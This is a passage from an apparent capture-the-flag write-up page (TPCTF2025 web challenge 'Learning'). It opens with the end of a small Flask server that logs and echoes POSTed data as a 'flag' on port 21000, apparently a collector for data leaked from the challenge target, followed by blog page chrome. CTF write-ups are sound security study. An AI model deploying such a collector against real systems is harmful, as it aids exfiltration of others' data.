<span class="hljs-comment"># 处 理  POST 请 求</span><br>    body = request.data.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    response = &#123;<br>        <span class="hljs-string">&#x27;status&#x27;</span>: <span class="hljs-string">&#x27;flag&#x27;</span>,<br>        <span class="hljs-string">&#x27;data&#x27;</span>: body<br>    &#125;<br>    <span class="hljs-built_in">print</span>(response)<br>    <span class="hljs-keyword">return</span> jsonify(response), <span class="hljs-number">200</span><br><br><br><span class="hljs-meta">@app.errorhandler(<span class="hljs-params"><span class="hljs-number">404</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">page_not_found</span>(<span class="hljs-params">e</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Not Found&#x27;</span>, <span class="hljs-number">404</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">21000</span>)<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/-WEB-Learning/image-20250312184013283.png" srcset="/img/loading.gif" lazyload alt="image-20250312184013283"></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E6%AF%94%E8%B5%9B/" class="print-no-link">#比赛</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>TPCTF2025-WEB-Learning</div>
+      <div>https://eddiemurphy89.github.io/2025/03/12/TPCTF2025-WEB-Learning/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>EddieMurphy</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年3月12日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/" title="2024年终总结">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">2024年终总结</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/03/01/AliyunCTF2025-JTools%E5%88%86%E6%9E%90/" title="AliyunCTF2025-JTools分析">
+                        <span class="hidden-mobile">AliyunCTF2025-JTools分析</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="waline"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#waline', function() {
+      Fluid.utils.createCssLink('https://registry.npmmirror.com/@waline/client/2.15.8/files/dist/waline.css')
+      Fluid.utils.createScript('https://registry.npmmirror.com/@waline/client/2.15.8/files/dist/waline.js', function() {
+        var options = Object.assign(
+          {"serverURL":"https://waline-test-89-frzkoc8l2-eddiemurphy89s-projects.vercel.app/","path":"window.location.pathname","meta":["nick","mail","link"],"requiredMeta":["nick"],"lang":"zh-CN","emoji":["https://cdn.jsdelivr.net/gh/walinejs/emojis/weibo"],"dark":"html[data-user-color-scheme=\"dark\"]","wordLimit":0,"pageSize":10},
+          {
+            el: '#waline',
+            path: window.location.pathname
+          }
+        )
+        Waline.init(options);
+        Fluid.utils.waitElementVisible('#waline .vcontent', () => {
+          var imgSelector = '#waline .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
